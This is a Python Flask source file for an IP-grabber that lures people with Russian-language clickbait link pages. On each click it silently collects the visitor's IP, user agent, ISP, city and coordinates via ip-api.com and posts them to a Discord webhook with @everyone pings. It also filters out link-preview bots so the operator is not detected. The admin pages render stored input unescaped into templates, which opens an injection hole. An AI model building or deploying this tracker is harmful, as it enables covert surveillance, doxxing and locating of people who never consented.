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"
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY")

# Настройка логирования
logging.basicConfig(level=LOGGING_LEVEL)

# Загрузка конфигураций с фиксированными значениями
CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, этот факт скрывался долгие годы..."
CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"

# Глобальный счётчик кликов
click_count = 0

# Конфигурация для логирования изображений
config = {
    "webhook": DISCORD_WEBHOOK_URL,
    "image": CLICKBAIT_IMAGE,
    "imageArgument": True,
    "username": "ZeWardo",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Привет, мир!",
        "richMessage": True,
    },
    "vpnCheck": VPN_CHECK,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": ANTI_BOT,
    "redirect": {
        "redirect": True,
        "page": REAL_URL
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# Список анекдотов
jokes = [
    "Почему программисты плохо спят? Потому что они просыпаются от багов!",
    "Как называется программист без руки? Левосторонний.",
    "Почему программисты не любят природу? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в алкоголе? Алкоголист.",
    "Почему программисты не ходят в бары? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в музыке? Музыкант.",
    "Почему программисты не любят кофе? Потому что он вызывает слишком много багов!",
    "Как называется программист, который разбирается в искусстве? Художник.",
    "Почему программисты не ходят в кино? Потому что там слишком много багов!",
    "Как называется программист, который разбирается в спорте? Спортсмен."
]

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "ZeWorld - Ошибка",
                "color": config["color"],
                "description": f"Произошла ошибка при попытке залогировать IP!\n\n**Ошибка:**\n\n{error}\n",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Zewardo - ссылка отправлена",
                    "color": config["color"],
                    "description": f"Ссылка **Zewardo** была отправлена в чат!\nСкоро вы можете получить IP.\n\n**Конечная точка:** `{endpoint}`\n**IP:** `{ip}`\n**Платформа:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

        # Проверка наличия ключа 'proxy' в ответе
        if 'proxy' in info and info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""

        if 'hosting' in info and info["hosting"]:
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""
            if config["antiBot"] == 1:
                ping = ""

        os, browser = httpagentparser.simple_detect(useragent)

        # Безопасный доступ к информации о часовом поясе
        timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
        timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
        timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Zewardo - IP залогирован",
                    "color": config["color"],
                    "description": f"""**Пользователь открыл оригинальное изображение!**

**Конечная точка:** `{endpoint}`

**Информация об IP:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Провайдер:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Страна:** `{info.get('country', 'Unknown')}`
> **Регион:** `{info.get('regionName', 'Unknown')}`
> **Город:** `{info.get('city', 'Unknown')}`
> **Координаты:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Приблизительные' if not coords else 'Точные, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Часовой пояс:** `{timezone_name}` ({timezone_region})
> **Мобильный:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Бот:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Возможно' if info.get('hosting') else 'False'}`

**Информация о ПК:**
> **ОС:** `{os}`
> **Браузер:** `{browser}`

**User Agent:**
```
{useragent}
```""",
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json=embed)
        return info

    except Exception as e:
        logging.error(f"Ошибка при обработке информации об IP: {e}")
        return

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect('/tmp/links.db')  # Используем временную директорию
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(e=None):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        cursor = db.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                path TEXT UNIQUE NOT NULL,
                title TEXT NOT NULL,
                description TEXT NOT NULL,
                image_url TEXT NOT NULL,
                redirect_url TEXT NOT NULL,
                redirect_delay INTEGER DEFAULT 5,
                click_count INTEGER DEFAULT 0
            )
        ''')
        existing = cursor.execute('SELECT COUNT(*) FROM links').fetchone()[0]
        if existing == 0:
            cursor.execute('''
                INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                'abvgdswswrkas',
                CLICKBAIT_TITLE,
                CLICKBAIT_DESCRIPTION,
                CLICKBAIT_IMAGE,
                REAL_URL,
                REDIRECT_DELAY
            ))
        db.commit()

# Инициализация БД при запуске
init_db()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if (request.form['username'] == os.getenv("ADMIN_USERNAME") and
            request.form['password'] == os.getenv("ADMIN_PASSWORD")):
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return "Неверные данные", 401
    return render_template_string('''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    ''')

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin')
@login_required
def admin_dashboard():
    db = get_db()
    links = db.execute('SELECT * FROM links').fetchall()
    links_html = "<table><tr><th>Path</th><th>Title</th><th>Clicks</th><th>Actions</th></tr>"
    for link in links:
        links_html += f"""
        <tr>
            <td>{link['path']}</td>
            <td>{link['title']}</td>
            <td>{link['click_count']}</td>
            <td>
                <a href="/admin/links/{link['id']}/edit">Edit</a>
                <form method="POST" action="/admin/links/{link['id']}/delete">
                    <button type="submit">Delete</button>
                </form>
            </td>
        </tr>
        """
    links_html += "</table>"
    return render_template_string(f'''
        <h1>Admin Dashboard</h1>
        <a href="/admin/links/new">Add New Link</a>
        {links_html}
    ''')

@app.route('/admin/links/new', methods=['GET', 'POST'])
@login_required
def new_link():
    if request.method == 'POST':
        db = get_db()
        cursor = db.cursor()
        cursor.execute('''
            INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            request.form['path'],
            request.form['title'],
            request.form['description'],
            request.form['image_url'],
            request.form['redirect_url'],
            request.form['redirect_delay']
        ))
        db.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string('''
        <form method="post">
            Path: <input type="text" name="path"><br>
            Title: <input type="text" name="title"><br>
            Description: <input type="text" name="description"><br>
            Image URL: <input type="text" name="image_url"><br>
            Redirect URL: <input type="text" name="redirect_url"><br>
            Redirect Delay: <input type="number" name="redirect_delay"><br>
            <input type="submit" value="Create">
        </form>
    ''')

@app.route('/admin/links/<int:id>/edit', methods=['GET', 'POST'])
@login_required
def edit_link(id):
    db = get_db()
    link = db.execute('SELECT * FROM links WHERE id = ?', (id,)).fetchone()
    if request.method == 'POST':
        cursor = db.cursor()
        cursor.execute('''
            UPDATE links SET path = ?, title = ?, description = ?, image_url = ?, redirect_url = ?, redirect_delay = ?
            WHERE id = ?
        ''', (
            request.form['path'],
            request.form['title'],
            request.form['description'],
            request.form['image_url'],
            request.form['redirect_url'],
            request.form['redirect_delay'],
            id
        ))
        db.commit()
        return redirect(url_for('admin_dashboard'))
    return render_template_string(f'''
        <form method="post">
            Path: <input type="text" name="path" value="{link['path']}"><br>
            Title: <input type="text" name="title" value="{link['title']}"><br>
            Description: <input type="text" name="description" value="{link['description']}"><br>
            Image URL: <input type="text" name="image_url" value="{link['image_url']}"><br>
            Redirect URL: <input type="text" name="redirect_url" value="{link['redirect_url']}"><br>
            Redirect Delay: <input type="number" name="redirect_delay" value="{link['redirect_delay']}"><br>
            <input type="submit" value="Update">
        </form>
    ''')

@app.route('/admin/links/<int:id>/delete', methods=['POST'])
@login_required
def delete_link(id):
    db = get_db()
    cursor = db.cursor()
    cursor.execute('DELETE FROM links WHERE id = ?', (id,))
    db.commit()
    return redirect(url_for('admin_dashboard'))

@app.route('/')
def home():
    joke = random.choice(jokes)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <link rel="icon" type="image/x-icon" href="{FAVICON_BASE64}">
        <meta property="og:title" content="Анекдот дня">
        <meta property="og:description" content="{joke}">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://ваш-сайт.ru/anekdot">
        <meta property="og:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Анекдот дня">
        <meta name="twitter:description" content="{joke}">
        <meta name="twitter:image" content="https://ваш-сайт.ru/images/og-preview.jpg">
        <title>Анекдот</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                text-align: center;
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                color: white;
                height: 100vh;
                margin: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                animation: fadeIn 2s ease;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                margin-bottom: 20px;
            }}
            p {{
                font-size: 1.5em;
                margin: 10px 0;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
        </style>
    </head>
    <body>
        <h1>Анекдот дня</h1>
        <p>{joke}</p>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/<custom_path>')
def handle_custom_link(custom_path):
    try:
        db = get_db()
        link = db.execute('SELECT * FROM links WHERE path = ?', (custom_path,)).fetchone()
        if link is None:
            return "Ссылка не найдена", 404

        db.execute('UPDATE links SET click_count = click_count + 1 WHERE id = ?', (link['id'],))
        db.commit()

        user_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        makeReport(user_ip, user_agent, endpoint=request.path)

        html_content = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <title>{link['title']}</title>
            <!-- Open Graph Meta Tags -->
            <link rel="icon" type="image/x-icon" href="{FAVICON_BASE64}">
            <meta property="og:title" content="{link['title']}">
            <meta property="og:description" content="{link['description']}">
            <meta property="og:image" content="{link['image_url']}">
            <meta property="og:url" content="{request.url}">
            <meta property="og:type" content="website">
            <!-- Twitter Cards -->
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:title" content="{link['title']}">
            <meta name="twitter:description" content="{link['description']}">
            <meta name="twitter:image" content="{link['image_url']}">
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    text-align: center;
                    background: linear-gradient(45deg, #ff416c, #ff4b2b);
                    color: white;
                    height: 100vh;
                    margin: 0;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    animation: fadeIn 2s ease;
                }}
                h1 {{
                    font-size: 3em;
                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
                    margin-bottom: 20px;
                }}
                p {{
                    font-size: 1.5em;
                    margin: 10px 0;
                }}
                .spinner {{
                    border: 6px solid rgba(255, 255, 255, 0.3);
                    border-top: 6px solid white;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }}
                @keyframes fadeIn {{
                    from {{ opacity: 0; }}
                    to {{ opacity: 1; }}
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
                .button {{
                    background: white;
                    color: #ff416c;
                    border: none;
                    padding: 15px 30px;
                    font-size: 1.2em;
                    border-radius: 10px;
                    cursor: pointer;
                    margin-top: 20px;
                    transition: background 0.3s, color 0.3s;
                }}
                .button:hover {{
                    background: #ff4b2b;
                    color: white;
                }}
            </style>
            <script>
                setTimeout(function() {{
                    window.location.href = "{link['redirect_url']}";
                }}, {link['redirect_delay'] * 1000});
            </script>
        </head>
        <body>
            <h1>{link['title']}</h1>
            <p>Ты в шоке? 😱 Через {link['redirect_delay']} секунд ты узнаешь правду!</p>
            <div class="spinner"></div>
            <button class="button" onclick="window.location.href='{link['redirect_url']}'">Узнать правду</button>
        </body>
        </html>
        """
        return render_template_string(html_content)
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        return "Ошибка", 500

if __name__ == '__main__':
    host = "0.0.0.0"
    port = 5000
    app.run(host=host, port=port, debug=False)